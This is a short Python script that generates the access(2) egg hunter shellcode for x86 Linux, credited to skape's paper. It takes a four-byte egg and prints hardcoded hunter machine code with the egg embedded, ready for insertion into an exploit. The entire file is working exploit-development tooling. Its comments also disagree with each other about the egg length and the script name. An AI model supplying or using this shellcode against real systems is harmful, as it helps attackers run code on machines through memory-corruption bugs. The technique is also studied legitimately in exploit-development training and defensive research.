#!/usr/bin/python
# make.py - generates a shellcode block for the access(2) egg hunter
# shellcode developed by skape as presented in his document "Safely 
# Searching Process Virtual Address Space", retrieved 4/22/2013 from
# http://hick.org/code/skape/papers/egghunt-shellcode.pdf
#
# This small program will accept an 8 character string for the 
# egg, hex or character, and output the shellcode in \x?? format
# for insertion into an exploit.
#
# Written by John Pierce, CISSP, 4/23/2013
#
import sys

input = sys.argv[1]

firstPart = "\\x31\\xd2\\x66\\x81\\xca\\xff\\x0f\\x42\\x8d\\x5a\\x04\\x6a\\x21\\x58\\xcd\\x80\\x3c\\xf2\\x74\\xee\\xb8"
secondPart = "\\x89\\xd7\\xaf\\x75\\xe9\\xaf\\x75\\xe6\\xff\\xe7"

print "\n\nUsage: make2.py [string/hex] where string is 4 chars long or"
print "if you enter hex, it's a doubleword preceded by 0x"
print "the doubleword will be generated twice in creating the egg\n\n" 
egg = ""
if input[0:2] == "0x":

	for j in range (2,10,2):
		egg+= "\\x"+input[j:j+2]
else:
	for c in input:
		egg += "\\x"+c.encode('hex')
print
print "Insert the following egg before your shellcode: "
print "egg: " + egg + egg

output = firstPart + egg + secondPart
print "Shellcode: \"" + output + "\";"
print 'Length: %d bytes' % (len(output)/4)


#output = firstPart + egg + secondPart
#print "Shellcode: \"" + output + "\";"
#print 'Length: %d bytes' % (len(output)/4)
#print "egg: " + egg + egg
